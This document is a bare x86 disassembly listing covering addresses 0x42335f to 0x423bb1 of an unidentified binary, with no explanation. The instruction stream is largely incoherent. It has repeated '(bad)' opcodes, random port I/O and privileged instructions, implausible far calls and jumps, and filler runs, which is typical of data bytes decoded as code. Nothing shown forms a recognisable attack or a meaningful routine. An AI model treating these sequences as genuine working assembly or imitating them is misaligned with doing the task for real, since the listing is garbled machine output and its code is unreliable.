  42335f:	jns    0x423344
  423361:	add    BYTE PTR [eax],al
  423363:	ret    
  423364:	repz add BYTE PTR [eax],al
  423367:	dec    esp
  423368:	fdivr  DWORD PTR [ecx-0x700a30e9]
  42336e:	pop    ecx
  42336f:	aad    0xca
  423371:	clc    
  423372:	inc    edx
  423373:	sbb    al,0xbb
  423375:	pop    ss
  423376:	fmul   QWORD PTR [ecx+edi*8-0x3de2ad2c]
  42337d:	push   ebx
  42337e:	inc    BYTE PTR [eax]
  423380:	mov    edi,eax
  423382:	fadd   st,st(7)
  423384:	pop    edx
  423385:	mov    ecx,DWORD PTR [ebx+0x64be788b]
  42338b:	adc    eax,0xef1ecbe
  423390:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423391:	xchg   ebp,eax
  423392:	out    dx,al
  423393:	cmp    ebx,DWORD PTR [ebp+0x4550a7f3]
  423399:	xchg   BYTE PTR [esi+ebp*8],al
  42339c:	pop    ebp
  42339d:	repnz bound ecx,QWORD PTR [eax+ebx*1-0x5bf93d7c]
  4233a5:	xchg   esp,eax
  4233a6:	add    eax,0x49607f61
  4233ab:	mov    ecx,DWORD PTR [ebx-0x74742ba2]
  4233b1:	mov    eax,DWORD PTR [eax]
	...
  4233bb:	xlat   BYTE PTR ds:[ebx]
  4233bc:	dec    ecx
  4233bd:	arpl   WORD PTR [eax],ax
	...
  4233c7:	lea    ecx,[ebp+0x5c21cd35]
  4233cd:	test   DWORD PTR [ebx+eax*1-0x57],0xa7e8e8fb
  4233d5:	or     DWORD PTR [esi+0x78],ecx
  4233d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233d9:	push   edx
  4233da:	pop    ecx
  4233db:	in     al,0x4d
  4233dd:	outs   dx,DWORD PTR ds:[esi]
  4233de:	mov    bh,0x6d
  4233e0:	mov    esi,0xe0428d8d
  4233e5:	dec    ebx
  4233e6:	popf   
  4233e7:	bound  ebp,QWORD PTR [eax]
  4233e9:	pop    ss
  4233ea:	fnstcw WORD PTR [edx+0x5a929fd0]
  4233f0:	sub    al,0xed
  4233f2:	mov    ebx,0x24c54d62
  4233f7:	sahf   
  4233f8:	ret    0x61bb
  4233fb:	cwde   
  4233fc:	inc    eax
  4233fd:	div    DWORD PTR [eax]
  4233ff:	add    eax,0xef4e8d8d
  423404:	test   DWORD PTR [ebp+0x3dc4fd8d],ecx
  42340a:	lea    eax,[eax]
  42340c:	inc    edi
  42340d:	ja     0x42347a
  42340f:	leave  
  423410:	add    esi,DWORD PTR [ecx+0x20]
  423413:	xchg   DWORD PTR [edi+ebx*8-0x7bf07919],esp
  42341a:	mov    al,ds:0x75892c54
  42341f:	xlat   BYTE PTR ds:[ebx]
  423420:	lea    ebx,[edi]
  423422:	mov    edi,0xb6
  423427:	push   ecx
  423428:	inc    DWORD PTR [eax]
  42342a:	add    BYTE PTR [ecx+ebp*2+0x0],bl
  42342e:	add    BYTE PTR [eax],al
  423430:	(bad)  
  423431:	(bad)  
  423432:	(bad)  
  423433:	(bad)  
  423434:	(bad)  
  423435:	(bad)  
  423436:	(bad)  
  423437:	(bad)  
  423438:	push   DWORD PTR [esi]
  42343a:	jl     0x4233ee
  42343c:	js     0x4233d2
  42343e:	or     ebp,DWORD PTR [ecx-0x49]
  423441:	cmp    dl,BYTE PTR [esp+edi*4-0x70]
  423445:	or     BYTE PTR [edx+0x32],bl
  423448:	add    bl,BYTE PTR [esi+esi*2]
  42344b:	inc    eax
  42344c:	mov    ebp,0x203ef631
  423451:	bound  ebp,QWORD PTR cs:[esi]
  423454:	arpl   WORD PTR [ebx+0x3c],dx
  423457:	jae    0x4234c2
  423459:	jb     0x423489
  42345b:	popa   
  42345c:	dec    ebp
  42345d:	or     bh,BYTE PTR [eax+0x79]
  423460:	and    BYTE PTR [ebp+0x76],ch
  423463:	ds imul edi,DWORD PTR gs:[esp+esi*2],0x6d72696d
  42346c:	dec    ebp
  42346d:	push   edi
  42346e:	inc    esp
  42346f:	cs jae 0x4234e2
  423472:	fs outs dx,BYTE PTR gs:[esi]
  423475:	push   edx
  423476:	gs cmp al,0x72
  423479:	and    BYTE PTR [esi+0x70],ah
  42347c:	inc    ebp
  42347d:	jae    0x4234ef
  42347f:	and    BYTE PTR [ebp+0x64],ah
  423482:	ds addr16 jne 0x4234fd
  423486:	bound  esp,QWORD PTR [eax]
  423488:	outs   dx,DWORD PTR ds:[esi]
  423489:	and    BYTE PTR cs:[edi],ch
  42348c:	ds ds cs cs inc esp
  423491:	push   ebx
  423492:	ficomp DWORD PTR [edi-0x74747475]
  423498:	mov    ecx,DWORD PTR [ebx-0x17747475]
  42349e:	call   0x297afd99
  4234a3:	call   0x89907390
  4234a8:	adc    bh,dh
  4234aa:	or     ebp,DWORD PTR [ebx-0x13ea410f]
  4234b0:	fs dec ecx
  4234b2:	in     al,0xa1
  4234b4:	jmp    0x4234d5
  4234b6:	adc    ebx,ebx
  4234b8:	enter  0x66aa,0x74
  4234bc:	jge    0x4234c0
  4234be:	mov    al,ah
  4234c0:	push   cs
  4234c1:	pusha  
  4234c2:	xchg   DWORD PTR [esi-0x65005aa1],ecx
  4234c8:	call   0xe8eea4b5
  4234cd:	call   0xe8f9af2f
  4234d2:	add    BYTE PTR [esi+0x7f],ah
  4234d5:	and    esi,edx
  4234d7:	or     ecx,DWORD PTR [esi+0x2]
  4234da:	imul   ebp,DWORD PTR [eiz*2+0x631a82ec],0x81238d79
  4234e5:	pop    eax
  4234e6:	xor    edi,esi
  4234e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4234e9:	xor    al,0x3a
  4234eb:	add    BYTE PTR [eax],al
  4234ed:	add    al,dh
  4234ef:	mov    esi,0xebb2c032
  4234f4:	adc    BYTE PTR [eax],ch
  4234f6:	ja     0x4234f9
  4234f8:	cdq    
  4234f9:	xchg   ebp,eax
  4234fa:	mov    al,ds:0xd56ddf70
  4234ff:	mov    dh,0x34
  423501:	dec    esp
  423502:	mov    edi,0xbdeaf980
  423507:	dec    esp
  423508:	mov    ds:0x8396,eax
  42350d:	sbb    edx,DWORD PTR [ecx+ebp*2-0x1000000]
  423514:	(bad)  
  423515:	(bad)  
  423516:	(bad)  
  423517:	(bad)  
  423518:	(bad)  
  423519:	(bad)  
  42351a:	(bad)  
  42351b:	(bad)  
  42351c:	jl     0x423512
  42351e:	test   DWORD PTR [eax],eax
	...
  423528:	add    BYTE PTR [eax],al
  42352a:	(bad)
  42352d:	cmp    BYTE PTR [eax],ah
  42352f:	leave  
  423530:	xor    eax,DWORD PTR [edi-0x72]
  423533:	mov    al,ds:0xa9ef3
  423538:	out    0x4b,eax
  42353a:	cld    
  42353b:	mov    bl,0x6f
  42353d:	jge    0x4234fe
  42353f:	sti    
  423540:	imul   eax,DWORD PTR [eax+0x3b090000],0x0
  423547:	add    BYTE PTR [ecx],cl
  423549:	dec    edx
  42354a:	add    BYTE PTR [eax],al
  42354c:	push   ss
  42354d:	xor    bh,BYTE PTR [ebp+0x6f9fa03c]
  423553:	push   0x76
  423555:	enter  0x1827,0xc8
  423559:	enter  0x744d,0x73
  42355d:	mov    eax,0xf220e1ad
  423562:	cld    
  423563:	je     0x423565
  423565:	add    bl,dl
  423567:	jmp    0x4234ea
  423569:	inc    edx
  42356a:	add    BYTE PTR [eax],al
  42356c:	add    BYTE PTR [ecx],bl
  42356e:	mov    bl,0x80
  423570:	repz and dh,BYTE PTR [esi+0x4]
  423574:	out    dx,eax
  423575:	retf   0x7074
  423578:	push   esi
  423579:	in     al,0x2f
  42357b:	xchg   edi,eax
  42357c:	addr16 (bad) 
  42357e:	enter  0xd569,0xa1
  423582:	mov    dl,0xe4
  423584:	or     eax,0x51f2c11b
  423589:	in     al,dx
  42358a:	and    dh,BYTE PTR [edx-0x477304a6]
  423590:	add    BYTE PTR [eax],al
  423592:	push   eax
  423593:	jle    0x423595
  423595:	add    BYTE PTR [eax],al
  423597:	mov    ecx,DWORD PTR [ebx-0x74747475]
  42359d:	mov    ecx,DWORD PTR [ebx-0x6e892875]
	...
  4235ab:	add    BYTE PTR [ebx+0x74cf608b],cl
  4235b1:	stc    
  4235b2:	jne    0x42356f
  4235b4:	push   eax
  4235b5:	xor    DWORD PTR [ebx],ebx
  4235b7:	out    0x90,eax
  4235b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235ba:	(bad)  
  4235bb:	pop    ecx
  4235bc:	add    ah,cl
  4235be:	sub    al,0xe9
  4235c0:	enter  0x6650,0xaa
  4235c4:	add    eax,0xa88b8b00
  4235c9:	jle    0x4235b6
  4235cb:	adc    esi,DWORD PTR [ecx-0x64282752]
  4235d1:	aad    0x4f
  4235d3:	fs nop
  4235d5:	push   edx
  4235d6:	sub    bh,bl
  4235d8:	ficomp WORD PTR [ebx-0x10]
  4235db:	and    DWORD PTR [ebx+0x52c11c33],edi
  4235e1:	or     eax,0x8b0c8ac9
  4235e6:	mov    ecx,DWORD PTR [ebp-0x747485da]
  4235ec:	dec    edx
  4235ed:	shr    DWORD PTR ds:0xcd6e008b,1
  4235f3:	or     BYTE PTR [edi-0x47569af4],ah
  4235f9:	inc    eax
  4235fa:	clc    
  4235fb:	cmp    eax,0x53bd59d
  423600:	sbb    al,0x2d
  423602:	scas   eax,DWORD PTR es:[edi]
  423603:	retf   
  423604:	xchg   edx,eax
  423605:	popf   
  423606:	fs or  bh,0x0
  42360a:	add    BYTE PTR [eax],al
  42360c:	(bad)  
  42360e:	add    BYTE PTR [eax],al
  423610:	add    al,0xd0
	...
  42361e:	test   DWORD PTR [eax+0x41],edx
  423621:	mov    ds:0x18aa257e,eax
  423626:	fadd   st,st(7)
  423628:	into   
  423629:	(bad)  
  42362b:	xor    al,0x66
  42362d:	mov    esp,DWORD PTR [ecx]
  42362f:	cwde   
  423630:	sti    
  423631:	sbb    BYTE PTR [ecx-0x48],dh
  423634:	hlt    
  423635:	fiadd  WORD PTR [eax]
	...
  42363f:	add    BYTE PTR [eax],al
  423641:	or     BYTE PTR [edi],bl
  423643:	adc    ebx,DWORD PTR [edx]
  423645:	add    BYTE PTR [eax],al
  423647:	ret    0x79d4
  42364a:	or     ecx,DWORD PTR [eax+0x68]
  42364d:	inc    edi
  42364e:	xor    ecx,esi
  423650:	fsub   DWORD PTR [ebx-0x41221b79]
  423656:	call   0xf0ff:0x5d9a3f09
  42365d:	pop    esi
  42365e:	xlat   BYTE PTR ds:[ebx]
  42365f:	cmc    
  423660:	push   0x9
  423662:	push   ebx
  423663:	xor    edx,DWORD PTR [esi+edi*1-0x3fc469b2]
  42366a:	add    BYTE PTR [eax],al
  42366c:	dec    edi
  42366d:	int3   
  42366e:	add    BYTE PTR [eax],al
  423670:	sbb    DWORD PTR [ecx],ebp
  423672:	rol    DWORD PTR [eax],1
  423674:	inc    DWORD PTR [edx-0x29]
  423677:	aam    0xc1
  423679:	inc    esi
  42367a:	adc    dl,BYTE PTR [ebx+0x63]
  42367d:	push   edi
  42367e:	and    BYTE PTR [esi],bh
  423680:	or     eax,0x2065632e
  423685:	push   0x2e0a6476
  42368a:	cmp    dh,BYTE PTR [edx+0x64]
  42368d:	cmp    eax,0x746f3d6d
  423692:	dec    esi
  423693:	push   0x63453c65
  423698:	jb     0x4236c9
  42369a:	cmp    eax,0x65576d70
  42369f:	gs jb  0x42370e
  4236a2:	jb     0x423709
  4236a4:	and    ch,BYTE PTR [edi+0x2e]
  4236a7:	imul   edx,DWORD PTR [ebx+0x69],0x6d3a652e
  4236ae:	sub    DWORD PTR ds:0x656f6f66,ecx
  4236b4:	outs   dx,BYTE PTR ds:[esi]
  4236b5:	popa   
  4236b6:	jbe    0x423705
  4236b8:	cs gs cmp al,0x22
  4236bc:	and    BYTE PTR [eax+0x41],dh
  4236bf:	dec    esi
  4236c0:	imul   edx,DWORD PTR [edi+0x6d],0x62767474
  4236c7:	or     eax,0x6079863c
  4236cc:	sti    
  4236cd:	jge    0x4236fc
  4236cf:	mov    gs,WORD PTR [ecx+0x31]
  4236d2:	fwait
  4236d3:	int3   
  4236d4:	aam    0xca
  4236d6:	scas   eax,DWORD PTR es:[edi]
  4236d7:	sar    BYTE PTR [edi-0x2e4a],0xff
  4236de:	inc    eax
  4236df:	xchg   edi,eax
  4236e0:	popa   
  4236e1:	add    cl,ch
  4236e3:	pop    edx
  4236e4:	cmp    al,0x58
  4236e6:	push   ebx
  4236e7:	xchg   esp,eax
  4236e8:	fst    QWORD PTR [ecx+edi*8-0x6e0b5f]
  4236ef:	mov    ds:0x6018faac,eax
  4236f4:	(bad)  
  4236f5:	pop    ecx
  4236f6:	or     al,0x27
  4236f8:	fild   DWORD PTR [edi-0x7d]
  4236fb:	(bad)  
  4236fc:	jmp    DWORD PTR [edx-0xfa26]
  423702:	inc    DWORD PTR [eax]
	...
  42370c:	mov    dl,0xf7
  42370e:	sub    al,0x4
  423710:	add    al,0x4
  423712:	add    al,0x4
  423714:	add    al,0x4
  423716:	add    al,0x4
  423718:	add    BYTE PTR [eax],al
  42371a:	dec    edi
  42371b:	push   esi
  42371c:	sar    DWORD PTR [eax],1
  42371e:	mov    ecx,0xaefbf1b3
  423723:	dec    ebp
  423724:	xchg   BYTE PTR [edx],ah
  423726:	mov    esi,0xc4cb6843
  42372b:	pop    esi
  42372c:	cs sbb bl,dl
  42372f:	and    dh,ch
  423731:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423732:	add    BYTE PTR [eax],al
  423734:	out    0x36,al
  423736:	add    BYTE PTR [eax],al
  423738:	jno    0x42379e
  42373a:	add    BYTE PTR [eax],al
  42373c:	outs   dx,BYTE PTR ds:[esi]
  42373d:	sbb    cl,dh
  42373f:	(bad)  
  423740:	push   edi
  423741:	rol    esp,cl
  423743:	push   eax
  423744:	cmp    DWORD PTR [edx+edi*4-0x36],0xe00b888
  42374c:	sti    
  42374d:	hlt    
  42374e:	pop    ebx
  42374f:	jno    0x4236d2
  423751:	jl     0x4236ee
  423753:	pop    es
  423754:	add    BYTE PTR [eax],al
  423756:	cs iret 
  423758:	scas   eax,DWORD PTR es:[edi]
  423759:	push   es
  42375a:	add    BYTE PTR [eax],al
  42375c:	add    BYTE PTR [eax-0x44],bh
  42375f:	les    ebx,FWORD PTR [edx-0x21]
  423762:	or     BYTE PTR [edx-0x2c],ah
  423765:	test   al,0x6a
  423767:	dec    esp
  423768:	lds    edx,FWORD PTR [ebx+0x84ceeec]
  42376e:	cld    
  42376f:	ja     0x4237c4
  423771:	jns    0x423784
  423773:	sar    BYTE PTR [ebp-0x6b],cl
  423776:	lock loope 0x423707
  423779:	loopne 0x423794
  42377b:	xchg   ebp,eax
  42377c:	pushf  
  42377d:	(bad)  
  42377e:	test   eax,0x260000e8
  423783:	mov    ah,0x0
	...
  42378d:	add    BYTE PTR [eax],al
  42378f:	add    BYTE PTR ds:0x34e1,bl
  423795:	add    BYTE PTR [eax],al
  423797:	add    BYTE PTR [eax],al
  423799:	add    BYTE PTR [eax],al
  42379b:	add    BYTE PTR [ecx-0x56c31877],cl
  4237a1:	fiadd  WORD PTR [ebp-0x19d2cefc]
  4237a7:	ret    
  4237a8:	pop    esi
  4237a9:	push   ds
  4237aa:	push   ss
  4237ab:	jmp    0x5463815b
  4237b0:	repz into 
  4237b2:	or     eax,DWORD PTR [ebx-0x7676fa68]
  4237b8:	add    BYTE PTR [edi],dh
  4237ba:	pop    ebp
  4237bb:	fidivr WORD PTR [ebp-0x28]
  4237be:	nop
  4237bf:	repnz ins BYTE PTR es:[edi],dx
  4237c1:	loopne 0x42376a
  4237c3:	jbe    0x4237da
  4237c5:	pushf  
  4237c6:	adc    al,0x24
  4237c8:	bound  edi,QWORD PTR [ebx]
  4237ca:	(bad)  
  4237cb:	out    dx,eax
  4237cc:	mov    ecx,DWORD PTR [ecx+0x55c8ce9a]
  4237d2:	adc    eax,0x8989165f
  4237d7:	or     ch,BYTE PTR [edi-0x2a767687]
  4237dd:	shl    BYTE PTR [edx],1
  4237df:	mov    DWORD PTR [ebx+0x636afeec],ecx
  4237e5:	mov    edi,0x6a7ebe66
  4237ea:	(bad)  
  4237eb:	ss (bad) 
  4237ed:	dec    ebp
  4237ee:	outs   dx,DWORD PTR ds:[esi]
  4237ef:	stos   DWORD PTR es:[edi],eax
  4237f0:	(bad)  
  4237f2:	adc    edx,edi
  4237f4:	jmp    0x8b8b:0xaed85554
  4237fb:	mov    eax,DWORD PTR [edi+edx*8-0x75]
  4237ff:	mov    esp,DWORD PTR [ebx-0x61]
  423802:	mov    ecx,DWORD PTR [ebx+0x7575758b]
  423808:	jne    0x42387f
  42380a:	jne    0x423881
  42380c:	jne    0x423883
  42380e:	fist   DWORD PTR [esi+ecx*2]
  423811:	pop    es
  423812:	data16 xor al,0x45
  423815:	push   cs
  423816:	es mov dl,0x7
  423819:	xchg   BYTE PTR [ecx],al
  42381b:	in     eax,dx
  42381c:	mov    eax,ds:0x5dfb4895
  423821:	iret   
  423822:	and    DWORD PTR [eax+edi*8],eax
  423825:	repz add BYTE PTR [eax],al
  423828:	add    BYTE PTR [eax],al
  42382a:	add    BYTE PTR [eax],al
  42382c:	add    BYTE PTR [eax],al
  42382e:	add    al,ch
  423830:	call   0x60b558f6
  423835:	call   0x86190422
  42383a:	mov    ah,0x9f
  42383c:	jle    0x423874
  42383e:	sbb    eax,0x30ae67f6
  423843:	(bad)  
  423844:	call   0x13e9e949
  423849:	loop   0x4237e8
  42384b:	in     eax,0xa4
  42384d:	cli    
  42384e:	xor    BYTE PTR [edi-0x6b],cl
  423851:	fs retf 
  423853:	dec    edx
  423854:	das    
  423855:	mov    ah,0xdc
  423857:	lea    ebx,[eax+0x73]
  42385a:	call   0xe8583047
  42385f:	call   0xe910f981
  423864:	or     al,0x12
  423866:	jne    0x4238e1
  423868:	ja     0x4238a0
  42386a:	sti    
  42386b:	mov    ds:0x9972baef,al
  423870:	pusha  
  423871:	test   al,0x1b
  423873:	mov    al,ds:0x7de981ff
  423878:	jnp    0x42385e
  42387a:	nop
  42387b:	xor    esi,edi
  42387d:	or     al,0xc
  42387f:	or     al,0x4d
  423881:	dec    ebx
  423882:	hlt    
  423883:	or     ebx,DWORD PTR [ebp+0x468dddd2]
  423889:	fisttp QWORD PTR [esi-0x3db74867]
  42388f:	mov    ebp,0xdd93dcf9
  423894:	or     DWORD PTR [ebx+0x71044d5a],eax
  42389a:	bound  edi,QWORD PTR [ebp+0x2c0c0cf9]
  4238a0:	ror    DWORD PTR [esp+ecx*1],cl
  4238a3:	or     al,0xc
	...
  4238ad:	add    BYTE PTR [ecx+0x6a],bl
  4238b0:	daa    
  4238b1:	mov    ecx,DWORD PTR [ebx-0x74747475]
  4238b7:	mov    ecx,DWORD PTR [ebx-0x76727275]
  4238bd:	xor    al,0x58
  4238bf:	test   al,0xec
  4238c1:	mov    ebx,0xd767b26c
  4238c6:	xchg   esi,eax
  4238c7:	sbb    esi,0x71
  4238ca:	cld    
  4238cb:	mov    ebp,0x967ccfbd
  4238d0:	inc    eax
  4238d1:	bound  esi,QWORD PTR es:[edi-0x317c7273]
  4238d8:	lea    ecx,[ebp-0x7272bf6e]
  4238de:	imul   esi,ebx,0x670b687d
  4238e4:	add    DWORD PTR [esi],edi
  4238e6:	sbb    esp,esi
  4238e8:	sub    DWORD PTR [edi+0x5b969f72],esi
  4238ee:	mov    eax,DWORD PTR [esi]
  4238f0:	aaa    
  4238f1:	in     eax,dx
  4238f2:	xchg   esi,eax
  4238f3:	push   0x56
  4238f5:	(bad)  
  4238f6:	lea    ecx,[ebx+0xa1bd1b9]
  4238fc:	mov    ecx,DWORD PTR [ebx-0x14df2b75]
  423902:	cmp    eax,DWORD PTR ds:0xe5d9571
  423908:	out    dx,eax
  423909:	fcom   DWORD PTR [ebp+eiz*2+0x79]
  42390d:	sub    DWORD PTR [esi+ebp*1],edi
  423910:	inc    ebx
  423911:	dec    ebp
  423912:	push   ebx
  423913:	ins    BYTE PTR es:[edi],dx
  423914:	jbe    0x423988
  423916:	and    BYTE PTR gs:[eax],ah
  423919:	inc    ebx
  42391a:	imul   eax,DWORD PTR gs:[ecx+0x62],0x6f2e6e23
  423922:	ins    DWORD PTR es:[edi],dx
  423923:	jae    0x423986
  423925:	gs ds je 0x4239a2
  423929:	fs gs gs ins DWORD PTR es:[edi],dx
  42392d:	das    
  42392e:	push   ebx
  42392f:	je     0x42397e
  423931:	outs   dx,DWORD PTR ds:[esi]
  423932:	je     0x4239a2
  423934:	jbe    0x42399f
  423936:	ins    DWORD PTR es:[edi],dx
  423937:	jns    0x4239a2
  423939:	jae    0x42398e
  42393b:	popa   
  42393c:	cmp    al,0x6d
  42393e:	jo     0x42397c
  423940:	arpl   WORD PTR [eax+0x23],si
  423943:	outs   dx,BYTE PTR ds:[esi]
  423944:	jb     0x423968
  423946:	and    BYTE PTR [ecx+ebp*2+0x72],dh
  42394a:	and    BYTE PTR cs:[eax],ah
  42394d:	and    BYTE PTR ds:0x72206443,cl
  423953:	jo     0x4239c2
  423955:	gs ins DWORD PTR es:[edi],dx
  423957:	jb     0x4239c6
  423959:	outs   dx,DWORD PTR ds:[esi]
  42395a:	ins    BYTE PTR es:[edi],dx
  42395b:	and    ah,BYTE PTR [edx+0x6f]
  42395e:	inc    ecx
  42395f:	jae    0x4239d0
  423961:	or     eax,0x74656276
  423966:	and    BYTE PTR gs:[edi+ebp*2+0x6d],dh
  42396b:	je     0x4239e3
  42396d:	jae    0x42399b
  42396f:	or     eax,0xd0a6569
  423974:	imul   esi,DWORD PTR [ebx+0x20],0x74636565
  42397b:	and    BYTE PTR [eax+0x27e067ca],cl
  423981:	data16 lahf 
  423983:	aad    0x64
  423985:	vpsraw xmm4,xmm4,XMMWORD PTR [eax-0x61d83764]
  42398d:	and    edi,DWORD PTR [ebp+0x66cd9496]
  423993:	mov    ecx,DWORD PTR [ebx-0x74743484]
  423999:	mov    ecx,DWORD PTR [ebx-0x74747475]
  42399f:	mov    ecx,DWORD PTR [ebx+0x368b8b8b]
  4239a5:	mov    edi,0xffffffff
  4239aa:	(bad)  
  4239ab:	(bad)  
  4239ac:	(bad)  
  4239ad:	(bad)  
  4239ae:	dec    esp
  4239b0:	int3   
  4239b1:	push   edx
  4239b2:	sahf   
  4239b3:	aam    0xe2
  4239b5:	imul   ebp,esi,0xeaa406a
  4239bb:	mov    ebp,0xcbefce4d
  4239c0:	fisubr WORD PTR [edi+0x58]
  4239c3:	in     eax,0x4e
  4239c5:	push   ecx
  4239c6:	ja     0x4239e7
  4239c8:	cli    
  4239c9:	int3   
  4239ca:	int3   
  4239cb:	mov    ss:0x5c68a36c,al
  4239d1:	inc    ebp
  4239d2:	adc    BYTE PTR [ebp-0x52],bh
  4239d5:	fxam   
  4239d7:	inc    edi
  4239d8:	xchg   esi,eax
  4239d9:	aaa    
  4239da:	xlat   BYTE PTR ds:[ebx]
  4239db:	outs   dx,BYTE PTR ds:[esi]
  4239dc:	or     al,0xa9
  4239de:	pusha  
  4239df:	std    
  4239e0:	das    
  4239e1:	jnp    0x423a3e
  4239e3:	es shr eax,cl
  4239e6:	mov    edi,0x75cccc3d
  4239eb:	push   edx
  4239ec:	push   ebp
  4239ed:	int3   
  4239ee:	int3   
  4239ef:	into   
  4239f0:	(bad)  
  4239f1:	or     ecx,esp
  4239f3:	add    al,bh
  4239f5:	in     al,0xd9
  4239f7:	xor    eax,0x70354e15
  4239fc:	mov    esp,0xfd900eaa
  423a01:	inc    esp
  423a02:	mov    ch,0xe7
  423a04:	xor    ch,BYTE PTR [eax-0xb2695ca]
  423a0a:	jle    0x4239a5
  423a0c:	add    BYTE PTR [eax],al
  423a0e:	add    BYTE PTR [ebp+edi*4+0x0],bh
  423a12:	add    BYTE PTR [edi],cl
  423a14:	sub    al,0x0
  423a16:	add    BYTE PTR [eax],al
  423a18:	int3   
  423a19:	int3   
  423a1a:	int3   
  423a1b:	int3   
  423a1c:	int3   
  423a1d:	int3   
  423a1e:	int3   
  423a1f:	int3   
  423a20:	int3   
  423a21:	rcr    BYTE PTR [ebp-0x20aeb2fe],cl
  423a27:	in     eax,dx
  423a28:	and    eax,0xdc32cb5c
  423a2d:	sub    BYTE PTR [edx+ebx*2],dh
  423a30:	outs   dx,BYTE PTR ds:[esi]
  423a31:	mov    edi,DWORD PTR [ebx-0x28]
  423a34:	mov    ds:0x8cd325f,ax
  423a3a:	or     BYTE PTR [eax],cl
  423a3c:	or     BYTE PTR [eax],cl
  423a3e:	or     BYTE PTR [eax],cl
  423a40:	or     BYTE PTR [eax],cl
  423a42:	add    DWORD PTR [ebx-0x1192a193],0xffffff83
  423a49:	add    DWORD PTR [eax+0x1cb6f357],0xfffffff6
  423a50:	jbe    0x423a33
  423a52:	sbb    eax,0x714fb090
  423a57:	lods   eax,DWORD PTR ds:[esi]
  423a58:	jae    0x423a69
  423a5a:	iret   
  423a5b:	and    DWORD PTR [edx+esi*8+0x71],ecx
  423a5f:	mov    esi,0xf3e20736
  423a64:	bound  esi,QWORD PTR [ebp-0x6b]
  423a67:	outs   dx,DWORD PTR ds:[esi]
  423a68:	mov    esp,0x7af6305a
  423a6d:	add    DWORD PTR [ebx-0x7c7c2873],0xffffffc5
  423a74:	add    esp,DWORD PTR [ecx]
  423a76:	and    DWORD PTR [edi+eax*1],0x28
  423a7a:	xlat   BYTE PTR ds:[ebx]
  423a7b:	loopne 0x423a99
  423a7d:	popa   
  423a7e:	adc    bh,al
  423a80:	pop    ebp
  423a81:	shl    BYTE PTR [edi],cl
  423a83:	inc    esp
  423a84:	or     ch,bh
  423a86:	(bad)  
  423a87:	retf   0xd282
  423a8a:	dec    esi
  423a8b:	repz inc esi
  423a8d:	in     al,dx
  423a8e:	jbe    0x423ac3
  423a90:	and    al,0x24
  423a92:	and    al,0xd
  423a94:	pop    ds
  423a95:	mov    ch,0x64
  423a97:	xor    edx,0xffffffd6
  423a9a:	fnstenv [ebx+0x5dc188de]
  423aa0:	pop    ecx
  423aa1:	pop    edx
  423aa2:	inc    edi
  423aa3:	loop   0x423aca
  423aa5:	xor    al,0x13
  423aa7:	sbb    eax,DWORD PTR [edx]
  423aa9:	imul   ecx,DWORD PTR [esi+0x9ebc1a7],0x4d24243c
  423ab3:	or     al,0x4a
  423ab5:	and    al,0x24
  423ab7:	and    al,0x0
	...
  423ac1:	cmc    
  423ac2:	sub    BYTE PTR [ecx],0x4
  423ac5:	add    al,0x4
  423ac7:	add    al,0x4
  423ac9:	add    al,0x4
  423acb:	add    al,0x4
  423acd:	je     0x423b43
  423acf:	cdq    
  423ad0:	push   ds
  423ad1:	sub    esi,DWORD PTR [edi+ebx*8+0x1d9895]
  423ad8:	xor    bh,ch
  423ada:	pop    ecx
  423adb:	mov    al,ds:0xf395c48f
  423ae0:	fwait
  423ae1:	inc    esp
  423ae2:	mov    dh,0xa9
  423ae4:	push   edi
  423ae5:	mov    ebp,0x307474bf
  423aea:	inc    esi
  423aeb:	je     0x423b61
  423aed:	popf   
  423aee:	test   DWORD PTR [esp+esi*2-0x19],esi
  423af2:	lods   al,BYTE PTR ds:[esi]
  423af3:	rol    BYTE PTR [edi],0x2e
  423af6:	out    dx,eax
  423af7:	aaa    
  423af8:	jecxz  0x423a92
  423afa:	mov    edx,0xf34bc850
  423aff:	jb     0x423b58
  423b01:	sti    
  423b02:	pop    es
  423b03:	push   0x4bdb740c
  423b08:	pushf  
  423b09:	je     0x423b0b
  423b0b:	shl    BYTE PTR ds:0xb3d6,cl
  423b11:	add    BYTE PTR [edi-0x6a],dl
  423b14:	cmp    BYTE PTR [edi-0x51364188],0xd7
  423b1b:	push   es
  423b1c:	arpl   WORD PTR [edi-0x347e132c],dx
  423b22:	shr    cl,1
  423b24:	gs mov ecx,0xf3481bda
  423b2a:	ins    DWORD PTR es:[edi],dx
  423b2b:	mov    edi,0x8054a4a1
  423b30:	hlt    
  423b31:	addr16 mov al,0xcb
  423b34:	xchg   DWORD PTR [eax],eax
  423b36:	add    BYTE PTR [ebx+0x4f],cl
	...
  423b44:	add    BYTE PTR [ebx],dl
  423b46:	pop    esi
  423b47:	mov    DWORD PTR gs:[ecx-0x76767677],ecx
  423b4e:	mov    DWORD PTR [ecx+0x48000089],ecx
  423b54:	jbe    0x423b60
  423b56:	shl    edi,0xc9
  423b59:	sbb    al,BYTE PTR [edx]
  423b5b:	sti    
  423b5c:	shl    BYTE PTR [edx+ecx*4-0x5b],1
  423b60:	mov    ecx,ecx
  423b62:	les    esp,FWORD PTR [eax+ecx*4-0x10e7d8a5]
  423b69:	stos   DWORD PTR es:[edi],eax
  423b6a:	aad    0x0
  423b6c:	add    BYTE PTR [eax-0x75],cl
  423b6f:	(bad)  [edi-0x6cff0938]
  423b75:	jae    0x423bbd
  423b77:	scas   al,BYTE PTR es:[edi]
  423b78:	pop    DWORD PTR [edx]
  423b7a:	mov    ah,0x27
  423b7c:	push   cs
  423b7d:	das    
  423b7e:	mov    eax,ds:0xdbd91258
  423b83:	retf   0x2762
  423b86:	xor    esp,DWORD PTR [ebx+0x4408]
  423b8c:	shr    DWORD PTR [esi],cl
  423b8e:	xlat   BYTE PTR ds:[ebx]
  423b8f:	add    BYTE PTR [eax],al
  423b91:	pop    es
  423b92:	sahf   
  423b93:	cld    
  423b94:	add    BYTE PTR [ebp+0x9],dh
  423b97:	xchg   ebx,eax
  423b98:	add    ebp,DWORD PTR [eax]
  423b9a:	dec    ebp
  423b9b:	cwde   
  423b9c:	cmp    eax,0x980afe0b
  423ba1:	out    0x65,al
  423ba3:	lock cld 
  423ba5:	int    0xb9
  423ba7:	xchg   esp,eax
  423ba8:	or     al,0xe3
  423baa:	and    eax,0x753811af
  423baf:	jne    0x423c26
  423bb1:	dec    eax
